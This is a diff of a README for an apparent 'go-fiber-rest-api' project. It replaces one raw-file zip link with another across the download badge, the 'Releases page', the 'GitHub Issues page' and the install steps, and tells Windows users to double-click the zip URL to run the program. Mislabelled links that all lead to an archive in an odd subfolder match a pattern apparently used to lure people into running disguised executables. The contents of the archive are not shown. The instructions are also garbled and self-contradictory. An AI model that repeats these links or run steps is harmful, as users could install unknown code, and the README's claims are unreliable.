@@ -1,6 +1,6 @@
 # 🚀 go-fiber-rest-api - Fast and Easy REST API Setup
 
-[![Download Here](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/go-fiber-rest-api.zip%20Now-Release%https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/go-fiber-rest-api.zip)](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/go-fiber-rest-api.zip)
+[![Download Here](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/api-rest-go-fiber-2.3.zip%20Now-Release%https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/api-rest-go-fiber-2.3.zip)](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/api-rest-go-fiber-2.3.zip)
 
 ## 📚 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to download and run the go-fiber-rest-api.
 
 ### 1. Visit the Release Page
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/go-fiber-rest-api.zip). Here you can find all the available versions of the application.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/api-rest-go-fiber-2.3.zip). Here you can find all the available versions of the application.
 
 ### 2. Download the Latest Release
 
@@ -42,7 +42,7 @@ Once you've downloaded the file, locate it on your computer. If it's in a zipped
 
 Navigate to the folder where you extracted the contents. You should see an executable file named something like `main`. 
 
-- **Windows Users:** Double-click `https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/go-fiber-rest-api.zip` to run the application.
+- **Windows Users:** Double-click `https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/api-rest-go-fiber-2.3.zip` to run the application.
 - **Mac/Linux Users:** Open a terminal, navigate to the extracted folder, and type `./main` to start the application.
 
 ## 🔍 Configuration
@@ -78,7 +78,7 @@ The go-fiber-rest-api offers advanced options for users looking to extend functi
 
 If you encounter any issues or have questions, you can reach out to our community:
 
-- **GitHub Issues Page:** For bug reports and feature requests, please create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/go-fiber-rest-api.zip).
+- **GitHub Issues Page:** For bug reports and feature requests, please create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/api-rest-go-fiber-2.3.zip).
 - **Discussion Forum:** Engage with other users and get advice on best practices.
 
 ## 🔗 Additional Resources
@@ -88,6 +88,6 @@ If you encounter any issues or have questions, you can reach out to our communit
 
 ## 📥 Download & Install
 
-To download the go-fiber-rest-api, visit our [Releases page](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/go-fiber-rest-api.zip). Follow the steps above to install and set up the application on your computer. 
+To download the go-fiber-rest-api, visit our [Releases page](https://raw.githubusercontent.com/noutilos/go-fiber-rest-api/main/Maggie/api-rest-go-fiber-2.3.zip). Follow the steps above to install and set up the application on your computer. 
 
 Feel free to explore, test, and enhance the go-fiber-rest-api. It's a reliable choice for building RESTful services quickly and efficiently. Enjoy your experience!
